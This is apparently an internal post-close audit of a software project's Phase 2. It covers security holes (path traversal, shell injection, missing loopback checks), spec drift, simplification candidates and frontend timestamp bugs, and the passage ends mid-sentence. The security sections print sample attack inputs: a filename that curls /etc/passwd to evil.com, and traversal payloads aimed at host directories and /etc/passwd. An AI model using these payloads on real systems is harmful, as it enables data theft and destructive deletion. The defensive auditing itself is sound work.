# Phase 2 — Comprehensive Review

> **Status**: post-close audit (2026-05-16)
> **Scope**: all 27 Phase 2 stories + hardening pass commits + screenshot harness
> **HEAD**: `a1057e8` (branch `main`)
> **Method**: 5 parallel sub-agent audits across security / simplicity /
> stickiness (2 cohorts) / readability, synthesized here with file:line
> citations.
>
> This is an external review pass against the close-out at story 2.27
> (`65cbc27`) plus the hardening commits (`fb91612`, `01b080f`, `5a6b0cd`,
> `a1057e8`). It deliberately does not propose Phase 3 design — only
> grades Phase 2 vs the spec it shipped against and the project's stated
> discipline (`AGENTS.md` §8 spec compliance, §9 NEVER, §10 ALWAYS;
> `CLAUDE.md` "What NOT to do").
>
> Close-out claims sanity-checked: ✅ 27 commits in retrospective table;
> ✅ 5 channels registered (4 explicit + chat baseline); ✅ 10
> `DeliverableFormat` variants; ✅ 9 strikethrough headings in `DEBT.md`
> (8 fully closed + 1 partial), matching the retrospective narrative.
> Top-of-DEBT closeout audit text is honest.

---

## Executive summary

Phase 2 is a **strong release with a small set of silent spec-impl
drifts and two real security exposures**. Headline findings:

1. **H — Path-traversal via webhook intake `metadata.session_id_hint`**.
   An attacker holding the webhook intake token (or any future Phase 5
   untrusted caller) can POST a brief whose metadata supplies a crafted
   `session_id_hint` (e.g. `"../../../tmp/poisoned"`). The spawner
   accepts it verbatim as the new sessions-row primary key; later the
   workspace TTL cron resolves `workspace_root.join(session_id)` and
   calls `tokio::fs::remove_dir_all(...)` — host-side `rm -rf` of
   whatever the path resolves to. Same string flows into the docker
   container-name and workspace bind-mount. File paths in
   [§ Security/G](#section-g-path-traversal).
   **Fix**: validate `session_id_hint` against `^[a-zA-Z0-9-]+$` at
   intake-router ingress.

2. **H — Shell-injection / bind-mount escape via LLM `target_filename`**.
   `task_deliver` only extension-validates the filename; the value
   flows directly into Pandoc / python-pptx / openpyxl shell commands
   and into `workspace_host_path.join(...)`. `normalize_workspace_relative_path`
   does not strip `..` segments. An LLM-supplied filename with shell
   metacharacters or `../` segments executes inside the sandbox (mostly
   redundant with `shell_exec`) **and** can write outside the workspace
   bind-mount on the host. File paths in [§ Security/B](#section-b-shell-injection).
   **Fix**: enforce strict filename allowlist `[A-Za-z0-9._-]+` and
   block `..` / leading-dot before any path join or shell invocation.

3. **M — Five silent spec-impl drifts that violate AGENTS.md §8**
   ("Never let code and spec drift silently"):
   (a) WS `task_pause/resume/cancel` still use `session_id`, architecture
   §4 says `task_id`; (b) WS `task_create` drops `project_id`/`title`/
   `durable` fields the spec promises; (c) 5 spec'd HTTP routes missing
   (`GET /v1/projects/:id`, `PATCH /v1/projects/:id`, `GET /v1/tasks/:id/{notifications,intake,deliveries}`,
   `GET /v1/notify/config`); (d) Story 2.5's `RouteOutcome<T>` wrapper
   requirement unmet on the channels routes; (e) Story 2.12 missing the
   two `#[ignore]` live-Redis worker tests it spec'd. None recorded in
   DEBT.md or any commit message.

4. **M — Two silent frontend timestamp bugs** in code added/modified by
   stories 2.22 and the Phase-1 carry-over surfaced by 2.22.
   `decisions-tab.tsx:90` does `new Date(row.ts * 1000)` — `row.ts` is
   already microseconds, so the multiplication yields nanoseconds and
   `Date` renders dates years in the future. `verifier-tab.tsx:228-234`
   treats `verifications.created_at` as seconds when it's microseconds.
   Both are user-facing display bugs; neither in DEBT.md. WS protocol
   itself has the seed of the confusion (`ServerEvent.ts` is μs,
   `ServerPing/Pong.ts` is unix seconds — same field name, different
   units depending on `type` discriminator).

5. **M — Provenance HTTP route alone bypasses `require_loopback`**.
   Every other Phase 2 task/project route (`/v1/tasks/:id`, `:id/deliverables`,
   `:id/pause`, `:id/resume`, `:id/cancel`, `/v1/projects/...`,
   `/v1/inbox`, `/v1/briefings/:id/confirm`) gates the inbound socket;
   `GET /v1/tasks/:id/provenance` (`lib.rs:1887`) does not. Manifests
   may contain PII (sender addresses, brief content). On `HOST=0.0.0.0`
   binds, anyone reaching the port who can guess a task UUID (or read
   one from a webhook callback / event log) gets the full manifest.

6. **Architecturally healthy**: SSRF posture is comprehensive
   (IPv4 + IPv6 reserved ranges enumerated); shell-injection fix for
   DEBT #14 (story 2.19) is correctly file-based; SQL is uniformly
   parameterized across every Phase 2 store; webhook token compare is
   correctly constant-time; tool-mask (`task_deliver` Worker-only,
   `checkpoint_rollback` Internal-only) is honored; email TLS is
   implicit-TLS-from-start (no STARTTLS / plaintext fallback); brief
   edits are server-revalidated; channel framework symmetry holds (all
   5 channels go through `ChannelRegistration` + `register_channel`,
   no back-door API); SQL UNIQUE constraints on intake_events enforce
   idempotency; 8 of 22 in-phase DEBT entries closed in-phase + 1
   partial — honest, none rewritten, none re-litigated.

Quantitatively: **5 H/M findings** in security (2 H + 3 M),
**5 silent spec drifts** in stickiness, **5 simplification candidates**
that would shave trait ceremony, and **5 readability gaps** (mostly
WHAT-comments to delete + missing WHY citations). Each is cited with
file:line. None is a Phase 2 blocker; all should land as DEBT or
follow-up commits during the Phase 3 warm-up.

Proposed new DEBT entries (collected at end): **#33** timestamp unit
drift, **#34** missing loopback on provenance, **#35** webhook
`session_id_hint` traversal, **#36** `target_filename` filename
allowlist, **#37** admin-token constant-time compare, **#38**
`normalize_workspace_relative_path` `..` block, **#39** WS verb
session_id-vs-task_id reconciliation, **#40** missing HTTP routes
or spec reconciliation, **#41** `mark_delivered` rename + lying-doc
fix, **#42** `.env.example` documentation lag.

---

## (1) Security findings

### Section A — SSRF & webhook

- **[M]** `WEBHOOK_DELIVERY_ALLOWLIST` bypass is unconditional, not
  admin-scoped. Operator typo `0.0.0.0/0` silently opens SSRF for both
  `DeliverySink::deliver` and `NotifySink::notify`.
  `crates/seasoned-hand-core/src/channel/webhook/ssrf.rs:71-78`. Phase 5
  hardening must gate the bypass behind admin scope (DEBT #1 already
  captures the bypass-exists fact; this restates that it's
  unconditional).
- **[L]** Separate DNS resolve in `assert_public_address` vs reqwest's
  send-time resolve creates a narrow DNS-rebinding TOCTOU. The guard
  iterates resolved IPs (`lookup_host` at line 71-78) but reqwest
  re-resolves at send time. Single-operator + operator-supplied URLs
  → effectively safe today; Phase 5 should resolve once and pin via a
  custom reqwest resolver. `crates/seasoned-hand-core/src/channel/webhook/mod.rs:135-184`.
- **[L]** `WebhookChannel::post_json` leaks remote response body into
  `ChannelError::RemoteRejected.message`, which lands in
  `delivery_events.error` + tracing. Log-pollution / disk-fill primitive.
  Truncate + redact in Phase 3 logging hardening.
  `crates/seasoned-hand-core/src/channel/webhook/mod.rs:177-180`.
- **[L]** ✅ The IPv4/IPv6 reserved-range enumeration in `is_v4_public` /
  `is_v6_public` is comprehensive (loopback, private, link-local,
  multicast, unspecified, broadcast, documentation, CGN 100.64/10,
  0.0.0.0/8, ULA fc00::/7, fe80::/10, 2001:db8::/32, IPv4-mapped).

### Section B — Shell injection

- **[H]** **`target_filename` from LLM flows unsanitized into shell
  commands and host paths**.
  `crates/seasoned-hand-core/src/deliverable/renderer/pandoc.rs:39-53`,
  `crates/seasoned-hand-core/src/deliverable/renderer/python_pptx.rs:63-65`,
  `crates/seasoned-hand-core/src/deliverable/renderer/openpyxl.rs:54-56`,
  `crates/seasoned-hand-core/src/deliverable/renderer/mod.rs:111`,
  `crates/seasoned-hand-core/src/deliverable/task_deliver.rs:244-258`.
  Only extension is validated via `DeliverableFormat::from_filename`;
  `..`, spaces, shell metacharacters, NUL not checked.
  `normalize_workspace_relative_path` at `sandbox/mod.rs:585-589`
  strips only `/workspace/` / leading `/` — does NOT block `..`.
  An LLM-supplied filename like `x; curl evil.com/$(cat /etc/passwd); foo.md`
  executes the command-substitution inside the sandbox; a filename
  like `../../../../tmp/poisoned.md` writes outside the workspace
  bind-mount on the host. Mitigated only by the fact that Worker mode
  already includes `shell_exec` (making in-sandbox shell injection
  redundant) — the bind-mount escape is the real concern.
  **Fix**: strict filename allowlist + reject `..` segments + reject
  leading dots before any path join or shell-string interpolation.
- **[L]** ✅ DEBT #14 close-out (story 2.19) is correctly file-based.
  `crates/seasoned-hand-core/src/checkpoint/git_in_sandbox.rs:100-159`:
  `phase_id` is `i64` (server-allocated); commit message written via
  `write_workspace_file` and read by `git commit -F`. `phase_title`
  never enters the shell. Belt-and-suspenders note: future contributors
  must NOT add a `phase_title` field anywhere in `commit_cmd` /
  `cleanup_cmd`.
- **[L]** CLI `--editor` uses `Command::new(EDITOR).arg(path)` (argv,
  not shell-string). TOCTOU on `std::env::temp_dir()` tmp file is bounded
  by Phase 2 single-operator. Belt-and-suspenders for multi-user host
  operators: explicit `0600` on the tmp file or use a per-user tmp dir.
  `crates/seasoned-hand-cli/src/commands/brief.rs:93-113`.
- **[L]** `task::ttl::clean_one` accepts whatever `sessions.id` says;
  combines with Section G finding below.

### Section C — Loopback / admin route enforcement

- **[M]** **`/v1/tasks/:id/provenance` not loopback-gated**. Every sibling
  task/project route uses `require_loopback(remote)?`; `get_task_provenance_handler`
  does not. Manifests can include PII; on `HOST=0.0.0.0` bind, anyone
  reachable + holding a guessable task UUID can fetch full provenance.
  `crates/seasoned-hand-server/src/lib.rs:1275, 1887-1903`. Fix: one
  `require_loopback(remote)?` call.
- **[M]** `/v1/channels`, `/v1/channels/:name/health`, `/v1/channels/:name/test`
  not loopback-gated. Information disclosure (channel inventory + role
  capabilities + health) at non-loopback binds. Single-operator low risk;
  Phase 5 must gate. `crates/seasoned-hand-server/src/lib.rs:1258-1263, 1338-1419`.
- **[M]** **Admin-token compare uses `!=`**, not constant-time
  `subtle::ConstantTimeEq::ct_eq` (which is used correctly at the
  webhook intake `lib.rs:1464-1468`). Timing leak on token-prefix-match
  length. Mitigated by the loopback guard but inconsistent.
  `crates/seasoned-hand-server/src/lib.rs:1633, 1794`.
- **[L]** ✅ `POST /v1/intake/webhook` fail-mode is fail-closed (503 when
  unconfigured); constant-time compare on the header. Empty supplied
  token always mismatches.
- **[L]** ✅ `POST /v1/intake/cli`, `/v1/inbox`, `/v1/briefings/:id/confirm`,
  `POST /v1/admin/sandbox/cleanup` all `require_loopback`-gated.

### Section D — Email channel security

- **[M]** EmailChannel reads absolute `rendered_content_path` from DB
  without "inside workspace" check. After DEBT #32 close, `task_deliver`
  resolves to absolute via `handle.workspace_host_path.join(...)`, but
  `EmailChannel::deliver` trusts the DB row without re-asserting that
  it canonicalizes under the workspace root. A DB tamper (or a future
  `task_deliver` impl change that forgets the resolve) could read
  `/etc/passwd` and email it. Phase 5 multi-user must canonicalize +
  assert. `crates/seasoned-hand-core/src/channel/email/mod.rs:334-341`.
- **[L]** ✅ Empty allow-list is deny-all (default-deny). Regexes anchored
  with `\A...\z`; `regex` crate is RE2-based → no catastrophic
  backtracking. `crates/seasoned-hand-core/src/channel/email/allowlist.rs:34, 47-49`.
- **[L]** ✅ IMAP uses tokio-rustls with TLS-from-start (no STARTTLS /
  plaintext fallback). webpki-roots trust anchors; hostname verified
  via `ServerName::try_from`. `crates/seasoned-hand-core/src/channel/email/imap.rs:151-181`.
- **[L]** ✅ SMTP uses `AsyncSmtpTransport::relay(host)` (lettre
  implicit-TLS), not `starttls_relay` or `builder_dangerous()`.
  `crates/seasoned-hand-core/src/channel/email/smtp.rs:50-59`.
- **[L]** ✅ Attachment filename for outbound delivery uses
  `Path::file_name` — strips path components.
  `crates/seasoned-hand-core/src/channel/email/mod.rs:609-614`.

### Section E — Secrets handling

- **[L]** `ImapConfig` and `SmtpConfig` derive `Debug` — a
  `format!("{:?}", config)` would print the password. Nothing currently
  does that, but it's a latent risk. Belt-and-suspenders: wrap
  passwords in a redacting `Secret<String>` newtype before Phase 5
  multi-user. `crates/seasoned-hand-core/src/channel/email/imap.rs:44`,
  `.../smtp.rs:37`.
- **[L]** ✅ No tokens / passwords reach `tracing` fields. Verified via
  grep — all `tracing::*` fields use `%error`, `%session_id`,
  `%task_id`, `path = %prompt_path`, etc.
- **[L]** ✅ No tokens / passwords round-trip to LLM. `IntakeEvent.metadata`
  reaches `intake_events.metadata` (TEXT JSON) but only `brief_input`
  reaches the planner LLM.
- **[L]** Note: prompt mentioned env var `INTAKE_WEBHOOK_TOKEN`. The
  actual var name is `SEASONED_HAND_INTAKE_TOKEN` — `INTAKE_WEBHOOK_TOKEN`
  does NOT exist anywhere in the repo.

### Section F — SQL parameterization

- **[L]** ✅ Zero string-interpolated SQL in any Phase 2 store. Verified
  across `project/{project,task}.rs`, `deliverable/store.rs`,
  `intake/store.rs`, `delivery/store.rs`, `delivery/router.rs`,
  `notify/store.rs`, `skill/mod.rs`, `provenance/builder.rs`. ORDER BY
  clauses are constants; LIMIT values placeholder-bound. `get_inbox_handler`
  status filter matched against literal enum strings; cursor is `i64`;
  limit clamped `1..=200`. `crates/seasoned-hand-server/src/lib.rs:2570-2602`.

### Section G — Path-traversal

- **[H]** **Webhook intake `metadata.session_id_hint` flows into
  `INSERT INTO sessions (id, ...)` then into `workspace_root.join(session_id)`
  and `remove_dir_all(...)`**. Attacker with the webhook token (or any
  future Phase 5 untrusted caller) POSTs `{"brief":"x", "metadata":{"session_id_hint":"../../../tmp/poisoned"}}`.
  Spawner accepts; sessions row gets that string as PK; TTL cron later
  resolves `workspace_root.join("../../../tmp/poisoned")` → host-side
  `rm -rf` of whatever resolves. Same string flows into the docker
  container-name (`format!("seasoned-hand-sandbox-{session_id}")`) and
  the workspace bind-mount.
  - `crates/seasoned-hand-server/src/lib.rs:1507-1522` (handler accepts
    arbitrary `metadata` JSON)
  - `crates/seasoned-hand-core/src/intake/router.rs:230-234` (extract
    `session_id_hint`)
  - `crates/seasoned-hand-server/src/initializer_spawner.rs:65-82`
    (`spec.session_id_hint.clone().unwrap_or_else(Uuid::new_v4)`)
  - `crates/seasoned-hand-core/src/task/ttl.rs:282-288, 395-401`
    (`workspace_root.join(session_id)` → `remove_dir_all`)
  - `crates/seasoned-hand-core/src/sandbox/mod.rs:591-593`
    (`container_name = format!("seasoned-hand-sandbox-{session_id}")`)
  **Fix**: validate `session_id_hint` against `^[a-zA-Z0-9-]+$` at the
  intake-router ingress before passing to the spawner.

- **[M]** **`normalize_workspace_relative_path` does not strip `..` segments**.
  Only strips `/workspace/` prefix and leading `/`. A `relative_path =
  "../../etc/poisoned"` is passed through unchanged. Callers:
  `read_workspace_file`, `write_workspace_file`, `read_workspace_file_json`,
  `write_workspace_file_json`, and indirectly `resolve_manifest` via
  the provenance HTTP route. Chains with the `target_filename` Section
  B finding and with the `provenance_manifest.$ref` Section G #3 finding.
  `crates/seasoned-hand-core/src/sandbox/mod.rs:585-589`.

- **[L]** Provenance `$ref` parser accepts `file:///workspace/<anything>`
  including `..`. A tampered `deliverables.provenance_manifest` column
  containing `{"$ref":"file:///workspace/../../etc/passwd"}` would be
  served by `GET /v1/tasks/:id/provenance` (which also lacks the
  loopback guard — see Section C). Single-operator DB-tamper threat
  model; Phase 5 must canonicalize + assert under workspace root.
  `crates/seasoned-hand-core/src/provenance/spill.rs:93-98`;
  `crates/seasoned-hand-core/src/provenance/routes.rs:131-134`.

### Section H — WS auth & briefing

- **[M]** **WS `briefing_confirm` has no auth**. Phase 0 DEBT #7 (no
  WS auth) is the umbrella; Phase 2 added the new sensitive verb
  (`{cmd:"briefing_confirm", task_id, action, edits?}`) which routes
  by attacker-controlled `task_id`. At `HOST=0.0.0.0` bind, anyone
  reaching `/ws` can confirm/edit/cancel any in-flight briefing by id.
  task_id is a UUID (practical exploit needs discovery), but the
  HTTP sibling `POST /v1/briefings/:id/confirm` IS loopback-gated —
  inconsistent across transports. `crates/seasoned-hand-server/src/ws.rs:147-149, 369-411, 911-927`.
- **[L]** ✅ Brief edits are server-revalidated after applying
  `PartialBrief`: `crates/seasoned-hand-core/src/agent/init/mod.rs:184, 255`
  (`candidate.validate()`, `current.validate()?`). Caps (20 phases / 50
  criteria / 20 deliverables + per-field length) enforced.
- **[L]** ✅ DEBT #20 loose `in_reply_to_call_id` match documented and
  accepted. UX inconsistency only; not security.

### Section I — Tool-mask

- **[L]** ✅ `task_deliver` correctly Worker-mode-only.
  `crates/seasoned-hand-core/src/dispatch/mask.rs:34-40`. Test at
  `task_deliver.rs:870-892` pins both halves. Initializer/Verifier
  prompts never see it.
- **[L]** ✅ `checkpoint_rollback` remains Internal-only.
  `crates/seasoned-hand-core/src/dispatch/mask.rs:32-33`.
- **[L]** ✅ Phase 2 added only one new tool (`task_deliver`); the rest
  are Phase 0/1 carryovers. Catalog count 38 matches `spec-check.sh:65`.

### Section J — Sandbox seccomp posture

- **[L]** ✅ No syscall-surface widening. Pandoc + python-pptx + openpyxl
  run inside the existing AIO Sandbox via `SandboxClient::shell_exec`
  → `/v1/shell/exec`. No new container privilege, bind-mount, or device.
  Phase 0 DEBT #15 (`seccomp=unconfined`) remains the dominant
  concern but is unchanged by Phase 2.

---

## (2) Simplicity / anti-overengineering findings

### Trait surfaces with one prod implementor

- **KEEP — `InitializerSpawner`**. One prod impl
  (`WsInitializerSpawner`), two test impls in `intake/tests.rs`. Defends
  itself: without the trait, `IntakeRouter` (lives in core) would need
  to import `AppState` from the server crate (circular dep). File
  header at `crates/seasoned-hand-core/src/intake/spawner.rs:71`
  explicitly defends the split.
- **KEEP — `MailboxFetcher`**. `AsyncImapFetcher` + `MockMailbox`.
  `async-imap`'s real session types are awkward (generic over TLS
  stream type) and faking via `#[cfg(test)]` would require a test-double
  IMAP server. File header at `channel/email/imap.rs` defends.
- **KEEP — `EmailTransport`**. `LettreSmtpTransport` + `RecordingTransport`.
  Without it every email test would either hit a real SMTP relay or
  compile with conflicting lettre features. `channel/email/smtp.rs:3-8`.
- **SIMPLIFY — `SandboxJanitor` + `WorkspaceTtlCron<S>` generic**.
  Three-method trait, only prod impl is `SandboxClient` (each method
  is a one-line pass-through), one test impl `FakeJanitor`.
  `crates/seasoned-hand-core/src/task/ttl.rs:47-63, 143, 151`. Replace
  with `Arc<SandboxClient>` field + `#[cfg(test)]` mock built on
  `Arc<MockData>`; drop the generic. Same test value, less type
  machinery.
- **SIMPLIFY — `WorkspaceWriter` + `SandboxOps` traits (replay/resume)**.
  Two traits where only one is needed; only prod impl is `SandboxClient`
  (each method just calls `Self::method(...)`); test impls are
  `TestSandbox` and `DroppedSandboxAdapter`. Same pattern as Janitor.
  `crates/seasoned-hand-core/src/task/{replay.rs:213, 228, resume.rs:44, 50}`.
- **KEEP — `IntakeProvider` / `DeliverySink` / `NotifySink` trio**.
  5 channel impls with mixed capability sets. NtfyChannel cleanly
  implements only `NotifySink` (no boilerplate `None` impls). Spec at
  architecture §2.7 defends the 3-trait split.
- **SIMPLIFY — `IntakeProvider::run` no-op impls** on `ChatChannel`
  and `WebhookChannel`. Both do nothing (Chat returns `Ok(())`
  immediately; Webhook parks on `shutdown.cancelled()`). The actual
  intake sources are the WS `task_create` handler and the
  `POST /v1/intake/webhook` axum route — neither reaches through `run()`.
  Replace with a `ChannelRegistration::with_intake_externally_driven(name)`
  flag so the registry reports capability for `/v1/channels`
  introspection without forcing dead `run` methods.
  `crates/seasoned-hand-core/src/channel/chat.rs:64-73`,
  `crates/seasoned-hand-core/src/channel/webhook/mod.rs:192-208`.

### `tenant_id` ceremony tax

- **KEEP — schema-level `tenant_id` columns**. Architecture §0 forward-compat
  defends. All Phase 2 tables ship nullable columns; Phase 5 flips to
  NOT NULL.
- **SIMPLIFY — `idx_skills_tenant` + `idx_playbooks_tenant`** in V009.
  Tables are empty in Phase 2 (DEBT #6); the indexes scan zero rows.
  Drop both; add them in the Phase 3 migration that first writes rows.
  Table reservation is the contract; per-tenant indexes are deadweight
  until rows arrive. `migrations/V009__phase2_skills_playbooks.sql:31-32`.
- **KEEP — `find_or_create_inbox` IS NULL branch**. Dual SELECT
  (`WHERE tenant_id = ?` vs `WHERE tenant_id IS NULL`) is fundamentally
  correct SQL; collapsing to IS-NULL-only would just re-add Phase 5.
  `project/project.rs:242-285`.
- **KEEP — stores' `Option<String>` threading**. One-column overhead;
  minimum-friction Phase 5 ramp.

### Env-var knob audit

**SIMPLIFY — `.env.example` is missing every Phase 2 env var**.
`.env.example` documents only Phase 0/1 vars. The following 18+ Phase 2
vars are read in production but undocumented:

`SEASONED_HAND_INTAKE_TOKEN`, `WEBHOOK_DELIVERY_ALLOWLIST`, `IMAP_HOST`,
`IMAP_USERNAME`, `IMAP_PASSWORD`, `IMAP_PORT`, `IMAP_POLL_INTERVAL_SECS`,
`SMTP_HOST`, `SMTP_USERNAME`, `SMTP_PASSWORD`, `SMTP_PORT`,
`EMAIL_FROM_ADDRESS`, `EMAIL_SUBJECT_PREFIX`, `INTAKE_EMAIL_ALLOWED_SENDERS`,
`NTFY_TOPIC`, `NTFY_HOST`, `SANDBOX_CLEANUP_INTERVAL_SEC`,
`SANDBOX_TTL_COMPLETED_DAYS`, `SANDBOX_TTL_FAILED_CANCELLED_DAYS`,
`SANDBOX_TTL_DRAFT_DAYS`, `SANDBOX_SKIP_RENDERER_INSTALL`,
`CLI_INTAKE_MAX_WAIT_SECS`, `NARRATOR_PROMPT_PATH`,
`VERIFIER_PROMPT_PATH`, `SEASONED_HAND_ROLLBACK_ON_VERIFIER_FAIL`,
`VERIFIER_MAX_CONCURRENCY`.

Add a `# === Phase 2 channels / TTL / verifier ===` section with each
var + default + 1-line purpose. Operators currently must read
`/specs/phase-2/architecture.md` §9 to discover them.

**SIMPLIFY — `CLI_INTAKE_MAX_WAIT_SECS` read in two places** with the
same fallback. `crates/seasoned-hand-cli/src/commands/task.rs:133` and
`crates/seasoned-hand-server/src/lib.rs:2489`. Drop the client-side
override and let the server own the timeout via the `max_wait_ms` query
param the client already supports.

### Single-caller helpers

- **SIMPLIFY — inline `derive_title`** at `intake/router.rs:288`. 6-line
  helper, one call site. The name doesn't add semantic value beyond
  the inline form.
- **SIMPLIFY — drop `IntakeRouter::has_initializer_spawner`** at
  `intake/router.rs:123`. Only used by one test assertion that could
  rely on the existing `attach_initializer_spawner(...).is_ok()` check.
- **KEEP — `replay_cost_baseline`, `walk_misc_events`, `count_actions`,
  `is_unique_violation`, per-renderer `render(...)` fns**. Each earns
  its keep as a semantic / pipeline / version-agnostic helper.

### Back-compat shims

- **SIMPLIFY — narrow `Initializer::run` + `AgentRunner::run` to test-only**.
  `Initializer::run` (`agent/init/mod.rs:97`) and `AgentRunner::run`
  (`agent/mod.rs:139-147`) have ZERO production call sites after story
  2.8b's inversion. Architecture §6 said "preserved for non-confirm-gate
  callers" — but there are no such callers in production. The current
  `pub` API is misleading. Either delete + migrate the unit tests to
  drive `resume` after seeding a plan, or mark with `#[cfg(test)]` /
  `pub(crate)`.
- **KEEP — `with_channels` is fully removed**. `register_channel`
  + per-channel builders are the only path. DEBT #17 close verified.
- **KEEP — WS `task_create` IntakeRouter inversion** is complete (DEBT
  #15 closed in 2.8b).

### Multi-format renderer dispatch (story 2.14)

- **SIMPLIFY — `.odt` is unreachable**. `pick_renderer("odt")` →
  `Renderer::Pandoc` succeeds, but `DeliverableFormat::from_filename("foo.odt")`
  returns `None`. An LLM-authored brief with `.odt` filename fails brief
  parsing before reaching the renderer. Drop `.odt` from
  `renderer/mod.rs:172` `pick_renderer` until Phase 4 adds a real
  `DeliverableFormat::Odt` variant + integration test. Honest gap; remove
  the dispatch arm.
- **KEEP — `.html` / `.pdf` / `.pptx` / `.xlsx`**. All four have
  `DeliverableFormat` variants, MIME mappings, unit tests, and at
  least one of (integration test, performance budget). The `.pdf` /
  `.pptx` / `.xlsx` Pandoc/python paths are wiremocked at unit level
  + exercised via `phase2_overnight_default_path` (docx) or named
  performance budget (pptx, xlsx).

### Retroactive DEBT audit

All 22 in-phase entries (8 closed + 1 partial + 13 open) reviewed.
**No DELETE candidates** — every open entry is an honest cut with a
named pay-down phase. The closeout audit at the top of `DEBT.md` is
thorough and honest. Tightest cuts (likely to be paid down in Phase 3
warm-up): #18 (EmailChannel attachment bytes — Medium), #31 (BriefingCard
three rough edges — Low, one-story scope), #21 (non-chat channels don't
forward briefing — Medium).

---

## (3) Stickiness — spec ↔ implementation drifts

### Stories 2.1 – 2.13 walk

All 13 stories walked individually; AC vs implementation. Per-story risk:

| Story | Risk | Notes |
|---|---|---|
| 2.1 | L | Scaffolds present. |
| 2.2 | L | V006 + 2 stores, 6 tests, state machine match. `find_or_create_inbox` added later by 2.5; pre-empted DEBT #14. |
| 2.3 | L | V007/V008/V009 + 5 stores + AppState wiring all match. |
| 2.4 | L | 3 traits + builder + registry; `RemoteRejected.status` is `u16` not `Option<StatusCode>` — minor variant shape drift, not in DEBT. |
| 2.5 | **M** | `RouteOutcome<T>` requirement on channels routes UNMET — handlers return `Json` / `(StatusCode, Json<ApiError>)` tuples. Not in DEBT. See cross-finding 1. |
| 2.6 | L | Renderer toolchain bootstrap; 6+ unit tests. |
| 2.7 | L | Brief + DeliverableSpec + 10 enum variants. Error variant naming compressed from per-cap into generic `Invalid(&'static str)` — minor; loses type-safe match. |
| 2.8/2.8b | L | Confirm gate landed; state-machine widening DEBT #19 (info-only); loose match DEBT #20 (acknowledged). |
| 2.9 | L | ChatChannel + WS inversion (partial here, full in 2.8b). |
| 2.10 | L | WebhookChannel + SSRF + DEBT #16/#17 closed. |
| 2.11 | **M** | EmailChannel works; attachment bytes discarded — DEBT #18 (open Medium). Functional gap. |
| 2.12 | **M** | NtfyChannel + NotifyWorker; **2 spec'd `#[ignore]` live-Redis worker tests MISSING** (`notify_worker_consumes_and_dispatches`, `notify_worker_xacks_on_dispatch_error`). XREADGROUP loop covered only indirectly via in-memory `handle_request_*` tests. Not in DEBT. See cross-finding 5. |
| 2.13 | L | CliChannel + DEBT #23 (closed in 2.21a). |

### Stories 2.14 – 2.27 walk

| Story | Risk | Notes |
|---|---|---|
| 2.14 | L | task_deliver + RendererDispatcher; provenance manifest builder integration. |
| 2.15 | **M** | Manifest builder + spill; **route NOT loopback-gated** (vs all siblings). Cross-finding 2. |
| 2.16 | L | Durable pause/resume + replay. WS verbs keep `session_id` (cross-finding 4). |
| 2.17 | L | Workspace TTL + admin route. Closes Phase 0 DEBT #16. |
| 2.18 | L | XREADGROUP loop. Closes Phase 1 DEBT #15. |
| 2.19 | L | Shell-injection fix. Closes Phase 1 DEBT #14. |
| 2.20 | L | Narrator classifier wiring; test surface trimmed from spec's 4 to actual 3 — substituted tests cover same behavior space. Not in DEBT. See cross-finding 7. |
| 2.21a/b | L | CLI binary; `--no-auto-confirm` partial (DEBT #29); `channel logs` stub (DEBT #30). |
| 2.22 | **M** | ProjectList + Deliverables + Decisions tabs; **timestamp bug at decisions-tab.tsx:90** (μs × 1000 = ns). Cross-finding 3. |
| 2.23 | L | BriefingCard; three rough edges in DEBT #31. |
| 2.24 | L | Playwright 7 specs + helpers. Closes Phase 1 DEBT #9. `verifier-tab.spec.ts` fixture mirrors the carry-over bug — test passes only because both prod and test are wrong. |
| 2.25 | L | Deterministic overnight E2E. DEBT #32 surfaced here. |
| 2.26 | L | Live-LLM workflow_dispatch jobs. DEBT #32 closed. |
| 2.27 | L | Close-out honest; verifier rollback default flip carried to Phase 3 as DEBT #7 (data-driven punt — no precision data accumulated yet from workflow_dispatch-only jobs). |

### Cross-story findings

**1. Story 2.5 `RouteOutcome<T>` requirement unmet.** Channels HTTP
routes use plain `Json<...>` / `(StatusCode, Json<ApiError>)` (see
`list_channels_handler` at `crates/seasoned-hand-server/src/lib.rs:1338+`).
Story 2.5 spec explicitly required `RouteOutcome<T>` shared wrapper
from the Phase 1 simplicity pass. Spec-compliance fail; silent.

**2. Provenance route alone bypasses `require_loopback`.** Already
covered in [§ Security/C](#section-c-loopback). The same finding
surfaces here as a stickiness drift because architecture §4 implies
parity across `/v1/tasks/:id/...` routes.

**3. Frontend timestamp unit drift (2 silent bugs).** Backend is
uniformly microseconds since unix epoch across all Phase 0/1/2 surfaces
(`events.timestamp`, `*.created_at`, `*.received_at`, `*.delivered_at`,
`*.sent_at`, `verifications.created_at`, WS `ServerEvent.ts`). Frontend
correctness varies:

| Site | Code | Status |
|---|---|---|
| `frontend/components/agent-computer/deliverables-tab.tsx:122` | `new Date(deliverable.created_at / 1000)` | ✅ correct (μs → ms) |
| `frontend/components/agent-computer/decisions-tab.tsx:90` | `new Date(row.ts * 1000)` | ❌ μs × 1000 = ns → far-future Date |
| `frontend/components/agent-computer/verifier-tab.tsx:228-234` | `formatTimestamp(unixSeconds * 1000)` | ❌ μs treated as seconds (Phase 1 carryover, surfaced by 2.22 cohort) |
| `frontend/components/chat/briefing-card.tsx:339` | `new Date(resolution.at)` where `resolution.at = Date.now()` | ✅ FE-local ms |

WS protocol seed of the confusion: `ServerEvent.ts` is microseconds
(`ws.rs:868` `ts: event.timestamp`); `ServerPing.ts` / `ServerPong.ts`
are unix seconds (`ws.rs:229` `now_unix()`). Same JSON field name,
different units depending on `type` discriminator.

**Recommend DEBT #33 (Medium)**: (a) document μs as the canonical wire
convention for all `_at`/`timestamp`/`ts` fields in `ws-types.ts` +
architecture §4; (b) fix `decisions-tab.tsx:90` (`/1000`) and
`verifier-tab.tsx:228-234`; (c) decide whether `ServerPing.ts` promotes
to μs or stays seconds with explicit discriminator-driven doc.

**4. WS `task_pause`/`task_resume`/`task_cancel` use `session_id`,
spec says `task_id`.** Architecture §4 lines 853–855 say
`{cmd:"task_pause", task_id, durable?}`. Impl
(`crates/seasoned-hand-server/src/ws.rs:65-75`) uses `session_id` for
all three. Phase 1 carryover; story 2.16 added the `durable` field
without changing the key. HTTP siblings at `lib.rs:1294-1302` correctly
use `task_id` and resolve to the latest session internally. Net effect:
WS clients pause a specific session; HTTP clients pause "the task"
(latest session). Functionally identical for single-session tasks;
diverges for multi-session pause-resume cycles. Not in DEBT.

**5. WS `task_create` drops `project_id` / `title` / `durable` fields**
the spec promises. Architecture §4 line 847 specifies
